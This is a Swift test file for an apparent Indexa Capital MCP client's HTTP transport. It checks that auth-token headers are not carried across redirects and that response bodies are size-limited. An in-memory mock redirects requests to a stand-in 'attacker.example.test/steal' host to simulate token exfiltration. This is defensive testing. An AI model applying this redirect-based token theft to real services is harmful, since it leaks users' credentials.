import Foundation
import Synchronization
import Testing

@testable import IndexaCapitalMCPCore

/// Answers requests in memory: `api.example.test` redirects to `attacker.example.test`,
/// which records whether the token arrived. Nothing leaves the process.
final class RedirectingProtocol: URLProtocol, @unchecked Sendable {
    static let tokenSeenByAttacker = Mutex(false)

    override class func canInit(with request: URLRequest) -> Bool {
        request.url?.host?.hasSuffix("example.test") == true
    }

    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }

    override func startLoading() {
        guard let url = request.url, let client else { return }
        if url.host == "attacker.example.test" {
            if request.value(forHTTPHeaderField: "X-AUTH-TOKEN") != nil {
                Self.tokenSeenByAttacker.withLock { $0 = true }
            }
            respond(url: url, status: 200, body: Data(#"{"stolen":true}"#.utf8))
            return
        }
        let target = URL(string: "https://attacker.example.test/steal")!
        let redirect = HTTPURLResponse(
            url: url, statusCode: 302, httpVersion: "HTTP/1.1", headerFields: ["Location": target.absoluteString])!
        var next = request
        next.url = target
        client.urlProtocol(self, wasRedirectedTo: next, redirectResponse: redirect)
        respond(url: url, status: 302, body: Data())
    }

    private func respond(url: URL, status: Int, body: Data) {
        let response = HTTPURLResponse(url: url, statusCode: status, httpVersion: "HTTP/1.1", headerFields: [:])!
        client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
        client?.urlProtocol(self, didLoad: body)
        client?.urlProtocolDidFinishLoading(self)
    }

    override func stopLoading() {}
}

/// Serves an invented body of a requested size, in memory.
final class SizedBodyProtocol: URLProtocol, @unchecked Sendable {
    override class func canInit(with request: URLRequest) -> Bool { request.url?.host == "size.example.test" }
    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }

    override func startLoading() {
        guard let url = request.url, let count = Int(url.lastPathComponent) else { return }
        let response = HTTPURLResponse(url: url, statusCode: 200, httpVersion: "HTTP/1.1", headerFields: [:])!
        client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
        client?.urlProtocol(self, didLoad: Data(repeating: 0x20, count: count))
        client?.urlProtocolDidFinishLoading(self)
    }

    override func stopLoading() {}
}

@Suite("URLSession transport", .serialized)
struct TransportTests {

    private func request(_ url: String) -> URLRequest {
        var request = URLRequest(url: URL(string: url)!)
        request.setValue("NOT-A-REAL-TOKEN", forHTTPHeaderField: "X-AUTH-TOKEN")
        return request
    }

    /// The whitelist pins the method and the path; this pins the destination host.
    @Test("A redirect is not followed, so the token never reaches the host it names")
    func redirectRefused() async throws {
        RedirectingProtocol.tokenSeenByAttacker.withLock { $0 = false }
        let transport = URLSessionTransport(timeout: 5, protocolClasses: [RedirectingProtocol.self])
        let response = try await transport.get(request("https://api.example.test/users/me"), byteLimit: 1 << 20)
        #expect(response.status == 302)
        #expect(RedirectingProtocol.tokenSeenByAttacker.withLock { $0 } == false)
    }

    /// Without this the test above would keep passing if URLSession stopped replaying custom
    /// headers across hosts, and would prove nothing.
    @Test("A session that follows redirects does hand the token over")
    func redirectFollowedLeaks() async throws {
        RedirectingProtocol.tokenSeenByAttacker.withLock { $0 = false }
        let configuration = URLSessionConfiguration.ephemeral
        configuration.protocolClasses = [RedirectingProtocol.self]
        let session = URLSession(configuration: configuration)
        _ = try await session.data(for: request("https://api.example.test/users/me"))
        #expect(RedirectingProtocol.tokenSeenByAttacker.withLock { $0 } == true)
    }

    @Test("A body is read up to one byte past the limit and no further")
    func bodyLimit() async throws {
        let transport = URLSessionTransport(timeout: 5, protocolClasses: [SizedBodyProtocol.self])
        let small = try await transport.get(request("https://size.example.test/10"), byteLimit: 100)
        #expect(try small.body.get().count == 10)
        let large = try await transport.get(request("https://size.example.test/5000"), byteLimit: 100)
        #expect(try large.body.get().count == 101)
    }
}
